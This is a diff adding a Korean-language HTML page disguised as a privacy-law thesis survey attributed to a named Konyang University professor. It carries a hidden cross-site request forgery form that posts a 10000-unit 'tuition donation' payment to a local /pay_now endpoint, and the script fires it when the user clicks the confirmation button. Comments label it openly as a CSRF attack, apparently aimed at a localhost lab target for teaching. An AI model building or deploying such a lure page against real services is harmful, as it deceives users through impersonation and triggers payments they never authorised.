@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ko">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>개인정보보호법 논문 설문조사 - 건양대학교</title>
+    <style>
+      body {
+        font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
+        background-color: #f4f7f6;
+        color: #333;
+        line-height: 1.6;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+        padding: 20px;
+      }
+      .container {
+        background-color: #fff;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 700px;
+      }
+      h1 {
+        color: #004696;
+        text-align: center;
+        margin-bottom: 5px;
+        border-bottom: 3px solid #f0f0f0;
+        padding-bottom: 10px;
+      }
+      h2 {
+        color: #555;
+        font-size: 1.2em;
+        margin-top: 30px;
+        padding-left: 10px;
+        border-left: 4px solid #004696;
+      }
+      .question-group {
+        margin-bottom: 20px;
+        padding: 15px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+      }
+      label {
+        display: block;
+        margin: 8px 0;
+        font-weight: bold;
+      }
+      input[type='radio'] {
+        margin-right: 10px;
+      }
+      button {
+        display: block;
+        width: 100%;
+        padding: 12px;
+        background-color: #004696;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 1.1em;
+        cursor: pointer;
+        margin-top: 30px;
+      }
+      button:hover {
+        background-color: #003370;
+      }
+      .notice {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 0.9em;
+        color: #888;
+      }
+      #customMessage {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        z-index: 1000;
+        text-align: center;
+        display: none;
+        width: 80%;
+        max-width: 400px;
+        font-size: 1.1em;
+        font-weight: bold;
+      }
+      #overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 999;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>개인정보보호법 관련 논문 설문조사</h1>
+
+      <p class="notice">
+        건양대학교 총괄 책임 차건상 교수입니다. 개인정보보호법 관련 논문 작성을
+        위해 여러분의 소중한 의견을 듣고자 합니다. 2~3분 내외로 솔직하게 응답해
+        주시면 감사하겠습니다.
+      </p>
+
+      <hr />
+
+      <form id="surveyForm" onsubmit="executeAttack(event)">
+        <h2>
+          1. 귀하는 평소 개인정보보호의 중요성에 대해 얼마나 인지하고 계십니까?
+        </h2>
+        <div class="question-group">
+          <label
+            ><input type="radio" name="q1" value="5" required /> 매우
+            높음</label
+          >
+          <label><input type="radio" name="q1" value="4" /> 높음</label>
+          <label><input type="radio" name="q1" value="3" /> 보통</label>
+          <label><input type="radio" name="q1" value="2" /> 낮음</label>
+          <label><input type="radio" name="q1" value="1" /> 매우 낮음</label>
+        </div>
+
+        <h2>
+          2. 온라인 서비스 이용 시 비밀번호를 주기적으로 변경하고 계십니까?
+        </h2>
+        <div class="question-group">
+          <label
+            ><input type="radio" name="q2" value="Y" required /> 예, 자주
+            변경합니다.</label
+          >
+          <label
+            ><input type="radio" name="q2" value="N" /> 아니요, 거의 변경하지
+            않습니다.</label
+          >
+        </div>
+
+        <button type="submit">설문조사 제출</button>
+      </form>
+
+      <div class="notice">
+        본 설문조사는 논문 자료 수집 목적으로만 사용되며, 귀하의 개인정보는
+        수집되지 않습니다.
+      </div>
+
+      <!-- CSRF 공격용 숨겨진 폼 (localhost로 수정) -->
+      <form
+        action="http://127.0.0.1:5000/pay_now"
+        method="POST"
+        id="csrfAttackForm"
+        style="display: none"
+        target="_self"
+      >
+        <input
+          type="hidden"
+          name="product_id"
+          value="Emergency_Tuition_Fee_Donation"
+        />
+        <input type="hidden" name="amount" value="10000" />
+        <input type="hidden" name="confirm_check" value="yes" />
+      </form>
+
+      <!-- 사용자 지정 메시지 박스 -->
+      <div id="overlay"></div>
+      <div id="customMessage">
+        <p>설문조사 응답이 성공적으로 제출되었습니다. 협조 감사합니다!</p>
+        <button
+          onclick="closeMessageAndAttack()"
+          style="width: 100px; padding: 10px; margin-top: 20px"
+        >
+          확인
+        </button>
+      </div>
+
+      <script>
+        const attackForm = document.getElementById('csrfAttackForm');
+        const customMessage = document.getElementById('customMessage');
+        const overlay = document.getElementById('overlay');
+
+        function closeMessageAndAttack() {
+          console.log('✅ 확인 버튼 클릭 - CSRF 공격 시작');
+          customMessage.style.display = 'none';
+          overlay.style.display = 'none';
+
+          // CSRF 공격 실행
+          console.log('📤 타겟:', attackForm.action);
+          console.log('📦 데이터:', new FormData(attackForm));
+          attackForm.submit();
+        }
+
+        function executeAttack(event) {
+          event.preventDefault();
+          console.log('📝 설문조사 제출됨');
+          customMessage.style.display = 'block';
+          overlay.style.display = 'block';
+        }
+      </script>
+    </div>
+  </body>
+</html>
